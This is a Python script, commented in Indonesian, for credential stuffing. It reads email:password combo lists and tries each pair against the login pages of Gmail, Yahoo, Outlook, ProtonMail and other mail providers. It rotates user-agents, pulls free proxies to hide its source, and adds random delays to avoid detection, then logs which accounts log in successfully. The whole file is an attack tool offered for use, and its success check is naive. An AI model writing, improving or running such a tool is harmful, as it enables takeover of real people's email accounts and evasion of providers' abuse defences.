import requests
import random
import time
import os
import logging
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor

# Konfigurasi logging
logging.basicConfig(filename='email_checker.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Daftar user-agent
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
]

# Mendapatkan URL login berdasarkan domain
def get_login_url(domain):
    domains = {
        "gmail.com": "https://accounts.google.com/ServiceLogin",
        "yahoo.com": "https://login.yahoo.com/",
        "outlook.com": "https://outlook.live.com/owa/",
        "mail.com": "https://mail.com/login",
        "zoho.com": "https://zoho.com/login",
        "protonmail.com": "https://protonmail.com/login",
        "aol.com": "https://login.aol.com/",
        "yandex.com": "https://mail.yandex.com/"
    }
    return domains.get(domain)

# Membuat sesi dengan retry mechanism
def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))
    return session

# Mendapatkan daftar proxy
def get_proxies():
    proxy_urls = [
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://www.free-proxy-list.net/",
        "https://www.us-proxy.org/"
    ]
    
    proxies = []
    session = create_session()
    for url in proxy_urls:
        try:
            response = session.get(url)
            proxies.extend(response.text.splitlines())
            if len(proxies) >= 500:
                break
        except Exception as e:
            logging.error(f"Error fetching proxies from {url}: {e}")
    
    return proxies[:500]  # Ambil hanya 500 proxy

# Mengecek apakah proxy hidup atau tidak
def check_proxies(proxies):
    live_proxies = []
    session = create_session()
    for proxy in proxies:
        try:
            response = session.get("http://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=5)
            if response.status_code == 200:
                live_proxies.append(proxy)
                logging.info(f"Proxy live: {proxy}")
        except:
            logging.warning(f"Proxy failed: {proxy}")
    return live_proxies

# Mendapatkan proxy secara acak
def get_random_proxy(live_proxies):
    if live_proxies:
        return {"http": random.choice(live_proxies), "https": random.choice(live_proxies)}
    return None

# Mengecek akses email
def check_email_access(email, password, proxies=None):
    domain = email.split('@')[-1]
    login_url = get_login_url(domain)
    
    if not login_url:
        logging.warning(f"Domain tidak didukung: {domain}")
        return

    headers = {
        'User-Agent': random.choice(user_agents)
    }
    data = {
        'email': email,
        'password': password
    }
    
    session = create_session()
    
    try:
        response = session.post(login_url, headers=headers, data=data, proxies=proxies, timeout=10)
        if response.ok:  # Cek jika login berhasil
            logging.info(f"{email} ==> login success (domain: {domain})")
            print(f"\033[92m{email} ==> login success (domain: {domain})\033[0m")
        else:
            logging.error(f"{email} ==> login failed (domain: {domain})")
            print(f"\033[91m{email} ==> login failed (domain: {domain})\033[0m")
    except Exception as e:
        logging.error(f"Error checking {email}: {e}")
        print(f"Error checking {email}: {e}")

# Validasi file input
def validate_file(file_path):
    if not os.path.exists(file_path):
        print(f"File {file_path} tidak ditemukan.")
        return False
    if not file_path.endswith('.txt'):
        print("Format file harus .txt")
        return False
    return True

# Pemrosesan email secara paralel
def process_email(email_password_tuple, proxies):
    email, password = email_password_tuple
    check_email_access(email, password, proxies)

# Fungsi delay dinamis
def dynamic_delay():
    time.sleep(random.uniform(1, 3))  # Delay acak antara 1 dan 3 detik

# Fungsi utama
def main():
    file_path = input("Masukkan path file email access.txt: ")
    
    if not validate_file(file_path):
        return

    with open(file_path, 'r') as file:
        lines = file.readlines()
    
    use_proxy = input("Apakah kamu ingin menggunakan proxy? (y/n): ").strip().lower()
    
    proxies = None
    live_proxies = []
    if use_proxy == 'y':
        proxy_list = get_proxies()
        logging.info(f"Total proxy yang didapat: {len(proxy_list)}")
        live_proxies = check_proxies(proxy_list)
        logging.info(f"Total proxy live: {len(live_proxies)}")
        proxies = get_random_proxy(live_proxies)
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        for line in lines:
            email_password_tuple = line.strip().replace('|', ':').replace(';', ':').split(':')
            executor.submit(process_email, email_password_tuple, proxies)
            dynamic_delay()

if __name__ == "__main__":
    main()
